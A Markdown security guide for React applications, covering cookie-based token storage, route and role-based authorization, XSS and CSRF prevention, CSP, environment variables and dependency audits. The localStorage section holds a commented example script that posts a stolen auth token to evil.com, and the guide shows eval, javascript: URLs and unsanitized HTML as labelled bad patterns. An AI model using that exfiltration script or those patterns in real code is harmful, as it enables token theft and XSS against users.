# Security

Security must be built into React applications from the start, not added as an afterthought.

## Authentication

### Token Storage

**✅ Recommended: HttpOnly Cookies**

```tsx
// Server sets HttpOnly cookie (backend code)
res.cookie('auth_token', token, {
  httpOnly: true,      // Not accessible via JavaScript
  secure: true,        // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});

// Frontend: No manual token handling needed
// Cookies sent automatically with requests
```

**❌ Avoid: localStorage/sessionStorage**

```tsx
// ❌ Bad - vulnerable to XSS
localStorage.setItem('auth_token', token);

// If attacker injects script:
// <script>
//   fetch('https://evil.com', {
//     method: 'POST',
//     body: localStorage.getItem('auth_token')
//   });
// </script>
```

### Auth State Management

```tsx
// features/auth/hooks/useAuth.ts
import { create } from 'zustand';

type AuthState = {
  user: User | null;
  isAuthenticated: boolean;
  login: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
  checkAuth: () => Promise<void>;
};

export const useAuthStore = create<AuthState>((set) => ({
  user: null,
  isAuthenticated: false,

  login: async (email, password) => {
    const user = await api.login(email, password);
    // Token stored in HttpOnly cookie by server
    set({ user, isAuthenticated: true });
  },

  logout: async () => {
    await api.logout(); // Server clears cookie
    set({ user: null, isAuthenticated: false });
  },

  checkAuth: async () => {
    try {
      const user = await api.getCurrentUser();
      set({ user, isAuthenticated: true });
    } catch {
      set({ user: null, isAuthenticated: false });
    }
  },
}));
```

### Protected Routes

```tsx
// components/ProtectedRoute.tsx
import { Navigate, Outlet } from 'react-router-dom';
import { useAuthStore } from '@/features/auth';

export function ProtectedRoute() {
  const isAuthenticated = useAuthStore(state => state.isAuthenticated);

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return <Outlet />;
}

// Usage
<Routes>
  <Route path="/login" element={<LoginPage />} />
  <Route element={<ProtectedRoute />}>
    <Route path="/dashboard" element={<Dashboard />} />
    <Route path="/profile" element={<Profile />} />
  </Route>
</Routes>
```

## Authorization

### Role-Based Access Control (RBAC)

```tsx
// types/auth.ts
export type UserRole = 'admin' | 'editor' | 'viewer';

export type User = {
  id: string;
  name: string;
  role: UserRole;
};

// hooks/useAuthorization.ts
export function useAuthorization() {
  const user = useAuthStore(state => state.user);

  const hasRole = (role: UserRole | UserRole[]) => {
    if (!user) return false;

    const roles = Array.isArray(role) ? role : [role];
    return roles.includes(user.role);
  };

  const can = (permission: Permission) => {
    if (!user) return false;
    return ROLE_PERMISSIONS[user.role]?.includes(permission) ?? false;
  };

  return { hasRole, can };
}

// Usage
function AdminPanel() {
  const { hasRole } = useAuthorization();

  if (!hasRole('admin')) {
    return <Navigate to="/unauthorized" />;
  }

  return <div>Admin Panel</div>;
}
```

### Permission-Based Access Control (PBAC)

```tsx
// config/permissions.ts
export type Permission =
  | 'users:read'
  | 'users:create'
  | 'users:update'
  | 'users:delete'
  | 'posts:read'
  | 'posts:create'
  | 'posts:update'
  | 'posts:delete';

export const ROLE_PERMISSIONS: Record<UserRole, Permission[]> = {
  admin: [
    'users:read', 'users:create', 'users:update', 'users:delete',
    'posts:read', 'posts:create', 'posts:update', 'posts:delete',
  ],
  editor: [
    'users:read',
    'posts:read', 'posts:create', 'posts:update',
  ],
  viewer: [
    'users:read',
    'posts:read',
  ],
};

// Component-level authorization
function DeleteButton({ postId }: { postId: string }) {
  const { can } = useAuthorization();

  if (!can('posts:delete')) {
    return null; // Hide button if no permission
  }

  return <button onClick={() => deletePost(postId)}>Delete</button>;
}
```

## XSS Prevention

### Sanitize User Content

```tsx
import DOMPurify from 'dompurify';

function UserComment({ comment }: { comment: string }) {
  // ❌ Bad - dangerouslySetInnerHTML without sanitization
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;

  // ✅ Good - sanitize first
  const sanitized = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### Avoid Dangerous Patterns

```tsx
// ❌ Bad - eval is dangerous
eval(userInput);

// ❌ Bad - Function constructor
new Function(userInput)();

// ❌ Bad - javascript: URLs
<a href={`javascript:${userInput}`}>Link</a>

// ✅ Good - validate and sanitize URLs
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

<a href={isSafeUrl(userUrl) ? userUrl : '#'}>Link</a>
```

## CSRF Protection

### SameSite Cookies

```tsx
// Server-side cookie configuration
res.cookie('auth_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // or 'lax' for cross-site navigation
});
```

### CSRF Tokens (if not using SameSite)

```tsx
// Get CSRF token from server
function useCSRFToken() {
  const [token, setToken] = useState('');

  useEffect(() => {
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setToken(data.token));
  }, []);

  return token;
}

// Include in requests
function createPost(data: PostData) {
  const csrfToken = useCSRFToken();

  return apiClient.post('/api/posts', data, {
    headers: {
      'X-CSRF-Token': csrfToken,
    },
  });
}
```

## Input Validation

### Client-Side Validation

```tsx
import { z } from 'zod';

const signupSchema = z.object({
  email: z.string().email('Invalid email'),
  password: z.string()
    .min(8, 'Password must be at least 8 characters')
    .regex(/[A-Z]/, 'Must contain uppercase letter')
    .regex(/[a-z]/, 'Must contain lowercase letter')
    .regex(/[0-9]/, 'Must contain number'),
  confirmPassword: z.string(),
}).refine(data => data.password === data.confirmPassword, {
  message: 'Passwords must match',
  path: ['confirmPassword'],
});

// Always validate on server too - client validation can be bypassed
```

## Content Security Policy (CSP)

```tsx
// Configure in your build tool or server
const cspDirectives = {
  'default-src': ["'self'"],
  'script-src': ["'self'", "'unsafe-inline'"], // Avoid unsafe-inline in production
  'style-src': ["'self'", "'unsafe-inline'"],
  'img-src': ["'self'", 'data:', 'https:'],
  'font-src': ["'self'", 'data:'],
  'connect-src': ["'self'", 'https://api.example.com'],
  'frame-ancestors': ["'none'"],
};

// Vite plugin example
export default defineConfig({
  plugins: [
    {
      name: 'csp',
      configureServer(server) {
        server.middlewares.use((req, res, next) => {
          res.setHeader(
            'Content-Security-Policy',
            Object.entries(cspDirectives)
              .map(([key, values]) => `${key} ${values.join(' ')}`)
              .join('; ')
          );
          next();
        });
      },
    },
  ],
});
```

## Environment Variables

### Secure Handling

```tsx
// ✅ Good - prefix public vars with VITE_ (Vite) or REACT_APP_ (CRA)
const API_URL = import.meta.env.VITE_API_URL; // Exposed to client

// ❌ Bad - never expose secrets to client
const SECRET_KEY = import.meta.env.SECRET_KEY; // Don't do this!

// Validate environment variables
const envSchema = z.object({
  VITE_API_URL: z.string().url(),
  VITE_ENV: z.enum(['development', 'staging', 'production']),
});

const env = envSchema.parse(import.meta.env);
```

## Dependency Security

### Audit Regularly

```bash
# Check for vulnerabilities
pnpm audit

# Fix automatically fixable issues
pnpm audit --fix

# Review and update dependencies
pnpm outdated
pnpm update
```

### Use Dependabot/Renovate

Configure automated dependency updates in `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

## Security Headers

Set these headers on your server:

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

## Security Checklist

- [ ] Use HttpOnly cookies for auth tokens
- [ ] Implement proper CSRF protection
- [ ] Sanitize all user-generated content
- [ ] Validate input on both client and server
- [ ] Set up Content Security Policy
- [ ] Configure security headers
- [ ] Never expose secrets to client
- [ ] Regularly audit dependencies
- [ ] Implement role-based or permission-based access control
- [ ] Use HTTPS in production
- [ ] Keep dependencies updated
- [ ] Review and test authorization logic

Security is an ongoing process - stay informed about new vulnerabilities and best practices.
